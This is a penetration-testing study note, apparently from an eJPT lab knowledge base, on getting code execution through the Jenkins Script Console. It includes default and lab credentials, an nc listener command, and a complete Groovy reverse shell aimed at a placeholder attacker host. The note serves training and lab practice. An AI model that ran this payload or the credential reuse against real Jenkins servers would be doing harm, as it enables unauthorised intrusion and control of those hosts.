---
type: technique
tags: [ejpt:host-net-pentest, ejpt:web-pentest]
tools: [curl]
cves: []
related: ["[[node-inspector-rce]]", "[[reverse-shells]]", "[[source-code-disclosure]]"]
---

# Jenkins Script Console RCE

Jenkins ships a **Script Console** (Manage Jenkins → Script Console, `/script`) that executes arbitrary Groovy **by design** — it is an admin feature, not a vulnerability and not a CVE. Any login that reaches it gets code execution as the Jenkins service user. The attack surface is therefore *authentication*, not memory corruption: the whole game is finding or reusing credentials.

## Recognition

- `nmap -p-` shows **Jetty** on 8080 (and often 443) with `http-robots.txt` — modern Jenkins runs behind Jetty, so the banner is `Jetty(10.0.x)`, not `Jenkins`.
- A login form at `/login` on the odd port. Classic Jenkins responses carry an `X-Jenkins` header; when absent, the login page's HTML (or its `cookies`) settles it.
- Credentials often wait elsewhere in recon: hidden HTML spans on another port ([[source-code-disclosure]]), defaults (`admin:admin`), or a spray ([[jenkhack]] planted `jenkins-admin:cassandra` in the port-80 page).

## Workflow

1. Reach `/login` and authenticate with whatever cred source recon produced.
2. Navigate to the **Script Console** (`/script`).
3. Paste the Groovy reverse shell below (host/port = attacker), catch it with `sudo nc -lvnp 443`.
4. Continue as the service user with normal host enum: `sudo -l`, `find`, [[hardcoded-credentials]].

## Key payload

Groovy reverse shell — `ProcessBuilder` starts `/bin/bash`, then a socket pump loops until either side closes:

```groovy
String host="ATTACKER";
int port=443;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

For a quick proof instead of a shell, `println "id".execute().text` is enough to confirm execution.

## Gotchas

- **You land as the service user** (`jenkins`), usually with no sudo — the foothold is the start of host enumeration, not the end ([[jenkhack]] went on to two more hops).
- Groovy is Java-adjacent: escape backslashes/quotes in strings, or build the payload from literals as above.
- The console runs **one shot per submission** — the socket loop is what keeps the session alive; a plain `cmd.execute()` returns and dies with the request.
- Filtered/locked-down installs restrict script approval (script security plugin) — if submissions are sandboxed, you're in *approval-bypass* territory instead; that *is* a vulnerability class of its own (not exercised here).

## Seen in

[[jenkhack]]
